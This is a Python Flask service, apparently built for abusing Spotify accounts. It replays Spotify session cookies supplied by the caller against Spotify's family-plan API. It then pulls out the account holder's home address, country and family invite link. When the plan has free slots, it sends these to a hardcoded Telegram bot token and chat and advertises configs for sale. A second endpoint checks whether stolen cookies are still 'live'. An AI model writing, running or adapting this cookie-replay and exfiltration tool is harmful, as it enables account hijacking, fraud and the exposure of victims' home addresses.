from flask import Flask, request
import requests
import telebot

app = Flask(__name__)

@app.route('/')
def abc():
    return "Api By Mon Leo Hay Khok Telegram @Monleohaykhok, don't forget join https://t.me/drugsluxury"
@app.route('/%27')
def abhc():
    return "SQL PROTECT"
@app.route('/api')
def get_cookies():
        cookies = request.cookies
        cookies_dict = cookies.to_dict()
        filtered_cookies = {}
        keys_to_keep = ['sp_m', 'sp_key', 'Host device_id', 'sp_dc', 'sp_gaid', 'sp_last_utm', 'sp_landing', 'sp_t', 'OptanonAlertBoxClosed', '_cs_c', '_scid', '_sctr', '_tt_enable_cookie', '_ttp', 'kdtv', '_kdt', 'RoktRecogniser', 'ltcid', '_cs_id', '_derived_epik', '_fbp', '_pin_unauth', '_rdt_uuid', '_scid_r', '_uetvid', 'payment-sdk-locales', 'ravelinDeviceId', 'ravelinSessionId', '__Host-sp_csrf_sid', '_cs_mk_ga']

        for key, value in cookies_dict.items():
            if key in keys_to_keep:
                filtered_cookies[key] = value

        headers = {
            'authority': 'www.spotify.com',
            'cookie': '; '.join([f"{key}={value}" for key, value in filtered_cookies.items()]),
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
            'referer': 'https://www.spotify.com/bo/family/home-hub/?e=p',
            'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
            'x-csrf-token': 'monleohaykhok21102008'
        }

        response = requests.get('https://www.spotify.com/api/family/v1/family/home/', headers=headers)

        try:
            data = response.json()
            address = data.get('address', '')
            country = data.get('members', [{}])[0].get('country', '')
            type = data.get('planType', '')
            slot = data.get('accessControl' , {}).get('planHasFreeSlots', '')
            inviteToken = data.get('inviteToken', '')
            invite_link = f"https://www.spotify.com/{country}/family/join/invite/{inviteToken}/"
            result = f"ConCa Ip: {country} Link: {invite_link} Address: {address} MLHK"
            print(slot)
            result2 = f"ConCa Khong Co Slot Ip: {country} Link: {invite_link} Address: {address} MLHK"
            if slot == True:
              bot_token = '5678937930:AAForYgL5zts5wawsdfmfgP_5-sraeugnp8'  
              bot = telebot.TeleBot(bot_token)
              chat_id = '-1002074013993' 
              mess = f'''SUCCESS SCRAPE SPOTIFY LINK✅
  Plan: Spotify Premium {type}
  Link: {invite_link}
  Address: {address}
  Country: {country}
  Buy Config inbox @monleohaykhok'''
              bot.send_message(chat_id, mess)
              return result
            else:
             return result2
        except ValueError as e:
            print(f"Error parsing JSON: {e}")

        return "Error retrieving data"
@app.route('/check')
def get_cookies2():
        cookies = request.cookies
        cookies_dict = cookies.to_dict()
        filtered_cookies = {}
        keys_to_keep = ['sp_m', 'sp_key', 'Host device_id', 'sp_dc', 'sp_gaid', 'sp_last_utm', 'sp_landing', 'sp_t', 'OptanonAlertBoxClosed', '_cs_c', '_scid', '_sctr', '_tt_enable_cookie', '_ttp', 'kdtv', '_kdt', 'RoktRecogniser', 'ltcid', '_cs_id', '_derived_epik', '_fbp', '_pin_unauth', '_rdt_uuid', '_scid_r', '_uetvid', 'payment-sdk-locales', 'ravelinDeviceId', 'ravelinSessionId', '__Host-sp_csrf_sid', '_cs_mk_ga']

        for key, value in cookies_dict.items():
            if key in keys_to_keep:
                filtered_cookies[key] = value

        headers = {
            'authority': 'www.spotify.com',
            'cookie': '; '.join([f"{key}={value}" for key, value in filtered_cookies.items()]),
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
            'referer': 'https://www.spotify.com/bo/family/home-hub/?e=p',
            'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
            'x-csrf-token': 'monleohaykhok21102008'
        }

        response = requests.get('https://www.spotify.com/api/family/v1/family/home/', headers=headers)

        try:
            data = response.json()
            fam = data.get('maxCapacity', '')
            abc1="Cookie Live: Premium Family --- Api By @Monleohaykhok"
            abc2="Cookie Live: Premium Duo --- Api By @Monleohaykhok"
            if fam ==6:
              return abc1
            else:
              return abc2
        except ValueError as e:
            print(f"Error parsing JSON: {e}")

        return "Error retrieving data"


if __name__ == '__main__':
        app.run(host='0.0.0.0')